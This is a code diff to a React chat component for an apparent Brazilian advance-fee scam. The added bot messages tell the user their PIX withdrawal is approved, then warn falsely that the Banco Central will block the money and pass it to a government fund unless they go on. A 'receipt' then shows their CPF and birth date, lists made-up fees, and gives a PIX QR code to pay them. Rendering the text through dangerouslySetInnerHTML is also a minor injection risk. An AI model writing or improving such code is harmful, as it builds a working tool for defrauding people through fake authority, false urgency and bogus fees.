@@ -111,8 +111,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
     setupChat();
   }, []);
 
-  const addBotMessage = (text: string, options?: any[], image?: string) => {
-    setMessages(prev => [...prev, { sender: "bot", text, options, image }]);
+  const addBotMessage = (text: string, options?: any[], image?: string, customType?: string) => {
+    setMessages(prev => [...prev, { sender: "bot", text, options, image, customType }]);
   };
 
   const addUserMessage = (text: string) => {
@@ -156,8 +156,23 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       
       setTimeout(() => {
         setTyping(false);
-        addBotMessage(`A sua **solicitação de saque foi aprovada** para a Chave Pix cadastrada:\n**Chave Pix:** ${pix}\n\nClique no botão abaixo para efetuar a **transferência do valor de ${leadValue}** para a conta da Chave Pix cadastrada.`, [
-          { text: "Receber por PIX", action: "generate_payment" }
+        addBotMessage(`Parabéns, **${leadName}**!\n\nA sua **solicitação de saque foi aprovada** para a Chave Pix cadastrada:\n**Chave Pix:** ${pix}\n\nClique no botão abaixo para efetuar a **transferência do valor de ${leadValue}** para a conta da Chave Pix cadastrada.`, [
+          { text: "Efetuar saque", action: "confirm_saque_1" }
+        ]);
+      }, 1500);
+    }
+    else if (action === "confirm_saque_1") {
+      setMessages(prev => {
+        const newMessages = [...prev];
+        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
+        return newMessages;
+      });
+      setTyping(true);
+      
+      setTimeout(() => {
+        setTyping(false);
+        addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
+          { text: "Efetuar Saque", action: "generate_payment" }
         ]);
       }, 1500);
     }
@@ -199,7 +214,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
          console.error("Payment generation error", err);
       }
       setTyping(false);
-      setFlowState(2); // Mostra o comprovante final
+      // Ao invés de setFlowState(2), adiciona a mensagem do recibo no chat
+      addBotMessage("", undefined, undefined, "receipt");
     }
   };
 
@@ -236,12 +252,106 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                     ? 'bg-[#1b365d] text-white rounded-2xl rounded-tr-sm' 
                     : 'bg-[#1e2732] text-[#d1d5db] rounded-2xl rounded-tl-sm'
                 }`}>
-                  {msg.image && (
-                     <img src={msg.image} alt="Banner" className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
+                  {msg.customType === "receipt" ? (
+                    <div className="w-full">
+                      {/* Receipt Card */}
+                      <div className="bg-white rounded-lg p-4 mb-5 shadow-sm text-gray-800">
+                        {/* Red Alert Header */}
+                        <div className="bg-[#fff1f2] rounded p-3 flex items-start gap-3 mb-4 border border-[#ffe4e6]">
+                          <AlertCircle className="text-[#f43f5e] w-8 h-8 flex-shrink-0 mt-0.5" />
+                          <div>
+                            <h4 className="text-[#e11d48] font-bold text-[15px]">PIX Pendente!</h4>
+                            <p className="text-[#fb7185] text-xs">Aguardando Pagamento da Tarifa Transacional...</p>
+                          </div>
+                        </div>
+
+                        {/* Recebedor info */}
+                        <div className="space-y-3">
+                          <h3 className="text-gray-600 font-bold text-sm">Dados do Recebedor:</h3>
+                          
+                          <div>
+                            <p className="text-xs text-gray-500">Nome:</p>
+                            <p className="text-sm font-medium text-gray-800 uppercase">{leadName}</p>
+                          </div>
+                          
+                          <div>
+                            <p className="text-xs text-gray-500">CPF:</p>
+                            <p className="text-sm font-medium text-gray-800">{data.docValue}</p>
+                          </div>
+
+                          <div>
+                            <p className="text-xs text-gray-500">Data de Nascimento:</p>
+                            <p className="text-sm font-medium text-gray-800">{data.birthDate}</p>
+                          </div>
+
+                          <div>
+                            <p className="text-xs text-gray-500">Chave Pix:</p>
+                            <p className="text-sm font-medium text-gray-800">{leadPixKey}</p>
+                          </div>
+
+                          <div>
+                            <p className="text-xs text-gray-500">Data:</p>
+                            <p className="text-sm font-medium text-gray-800">{new Date().toLocaleDateString('pt-BR')}</p>
+                          </div>
+
+                          <div>
+                            <p className="text-xs text-gray-500">Valor:</p>
+                            <p className="text-sm font-bold text-gray-800">{leadValue}</p>
+                          </div>
+                        </div>
+                      </div>
+
+                      {/* Text below receipt */}
+                      <div className="text-white space-y-4 text-sm leading-relaxed">
+                        <p className="font-bold text-[15px]">GUIA DE PAGAMENTO GERADA COM SUCESSO!</p>
+                        <p>O cálculo do valor total da tarifa é feito sobre o valor que você tem disponível para receber ({leadValue}).</p>
+                        
+                        <div>
+                          <p>Tarifa Transacional: R$ {(tarifa * 0.33).toFixed(2).replace('.', ',')}</p>
+                          <p>Contribuição Federal: R$ {(tarifa * 0.33).toFixed(2).replace('.', ',')}</p>
+                          <p>Tarifa de Saque: R$ {(tarifa * 0.34).toFixed(2).replace('.', ',')}</p>
+                          <p className="font-bold mt-1">Total da Tarifa: R$ {tarifa.toFixed(2).replace('.', ',')}</p>
+                        </div>
+
+                        <p className="font-bold uppercase">
+                          APÓS O PAGAMENTO DA TARIFA, EM ATÉ 2 HORAS VOCÊ RECEBERÁ O VALOR TOTAL DE {leadValue} NA CONTA DA CHAVE PIX CADASTRADA:
+                        </p>
+
+                        <div>
+                          <p><span className="font-bold">Nome:</span> {leadName}</p>
+                          <p><span className="font-bold">Chave Pix:</span> {leadPixKey}</p>
+                        </div>
+                      </div>
+
+                      {/* PIX Payment Area */}
+                      <div className="mt-6 pt-5 border-t border-[#2e3b4e] flex flex-col items-center space-y-4">
+                        {buyPixData?.pix_qr_code ? (
+                          <>
+                            <div className="bg-white p-2 rounded-xl border border-gray-200 shadow-sm w-48 h-48 flex items-center justify-center">
+                                <QRCodeCanvas value={buyPixData.pix_qr_code} size={160} />
+                            </div>
+                            <button onClick={copyPix} className="w-full max-w-[280px] bg-[#ff9029] hover:bg-[#e87f1f] text-white py-3 rounded-md font-bold transition-colors shadow-md text-sm mt-4">
+                                Copiar Código PIX
+                            </button>
+                          </>
+                        ) : (
+                          <div className="flex justify-center p-4">
+                            <Loader2 className="w-6 h-6 text-white animate-spin" />
+                          </div>
+                        )}
+                      </div>
+
+                    </div>
+                  ) : (
+                    <>
+                      {msg.image && (
+                         <img src={msg.image} alt="Banner" className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
+                      )}
+                      {msg.text.split('\n').map((line:string, idx:number) => (
+                         <p key={idx} className={`${idx !== 0 ? 'mt-2' : ''}`} dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-white">$1</strong>')}} />
+                      ))}
+                    </>
                   )}
-                  {msg.text.split('\\n').map((line:string, idx:number) => (
-                     <p key={idx} className={`${idx !== 0 ? 'mt-2' : ''}`} dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-white">$1</strong>')}} />
-                  ))}
                 </div>
 
                 {msg.options && msg.options.length > 0 && (
